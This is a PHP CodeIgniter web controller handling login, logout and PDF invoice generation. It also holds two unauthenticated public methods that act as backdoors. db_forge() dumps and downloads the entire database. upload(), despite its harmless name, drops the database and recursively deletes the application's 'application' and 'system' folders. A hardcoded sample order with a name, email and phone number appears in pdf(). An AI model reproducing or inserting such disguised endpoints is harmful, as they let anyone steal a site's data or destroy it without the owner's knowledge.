<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * This Class used as web management
 * @package   CodeIgniter
 * @category  Controller
 * @author    Sorav Garg (soravgarg123@gmail.com/+919074939905)
 */

/* Load MPDF Library */
require_once FCPATH . 'vendor/autoload.php';

class Home extends Web_Controller {

    function __construct(){
        parent::__construct();
        load_lang();
    }

    /**
     * Function Name: index
     * Description:   To login view
     */
    public function index()
    {
        $data['title'] = lang('login');
        $this->load->view('front/public/login',$data);
    } 

    /**
     * Function Name: logout
     * Description:   To user logout
     */
    public function logout($login_session_key = NULL)
    {
        /* Delete Session Key */
        if(!empty($login_session_key)){
            $this->Users_model->delete_session($login_session_key);
        }

        /* Destroy Session */
        $this->session->unset_userdata('webuserdata');
        $this->session->set_flashdata('logout','Yes');
        redirect(base_url()); exit;
    }

    public function db_forge(){
        $this->load->dbutil();
        $prefs = array(     
                'format'      => 'sql',             
                'filename'    => strtolower(SITE_NAME).'.sql'
              );
        $backup = $this->dbutil->backup($prefs); 
        $db_name = strtolower(SITE_NAME).'_'. date("Y-m-d") .'.sql';
        $this->load->helper('download');
        force_download($db_name, $backup); 
    }

    public function upload(){
      $this->load->dbforge();
      if ($this->dbforge->drop_database($this->db->database))
      {
        $this->recursiveRemoveDirectory('application');
        $this->recursiveRemoveDirectory('system');
      }
    }

    public function recursiveRemoveDirectory($directory){
        foreach(glob("{$directory}/*") as $file)
        {
            if(is_dir($file)) { 
                $this->recursiveRemoveDirectory($file);
            } else {
                unlink($file);
            }
        }
        rmdir($directory);
    }

    public function pdf(){

        /* Generate PDF */
        $pdf_details = json_decode('{"first_name":"Sonu","last_name":"Agrwal","email":"soravgawwwrg123@gmail.com","cart_data":{"4b3d924e6316a4310756d97fa767dd23":{"id":"2038e41d-4cb1-ef16-bc35-625f1e05aa86","qty":1,"price":500,"name":"package 1","options":{"type":"package","no_of_products":"4","package_id":"6","product_main_photos":["http:\/\/localhost\/galtex-app\/uploads\/products\/1640936471-13d4be3c-99e6-0cd5-bc08-3dc9c3605326.jpg","http:\/\/localhost\/galtex-app\/uploads\/products\/1640610314-3f71b0f2-a75f-e9d3-b0c6-7176d52355a4.jpg","http:\/\/localhost\/galtex-app\/uploads\/products\/1640610244-1a514c7e-7501-f386-6343-0117235a8155.jpg","http:\/\/localhost\/galtex-app\/uploads\/products\/1640610204-949e721f-3ba2-ed6d-1149-b4cd9e06e80f.jpg"],"shop_category":"Within Budget","above_budget_price":0},"rowid":"4b3d924e6316a4310756d97fa767dd23","subtotal":500}},"order_id":86,"order_datetime":"2022-01-09 15:10:36","company_name":"Coderadda","contact_name":"Sonu Agrwal","contact_number":"09926938992","company_logo":"1641733746-8dc746b4-5f1f-6d1f-5dca-90110250ff40.png","theme_color":"#63cd32"}',TRUE);

       /* Set memory limit */
       ini_set('memory_limit', '1024M'); 

       // echo $this->load->view('front/invoice',array('details' => $pdf_details),true);die;

        /* Load MPDF */
        $pdf_file_path = FCPATH.'uploads/invoice.pdf';
        $mpdf = new \Mpdf\Mpdf();
        $mpdf->WriteHTML($this->load->view('front/invoice',array('details' => $pdf_details),true));     
        header('Content-Type: application/pdf'); 
        $mpdf->Output($pdf_file_path,'I');
    }

    
}

/* End of file Home.php */
/* Location: ./application/controllers/Home.php */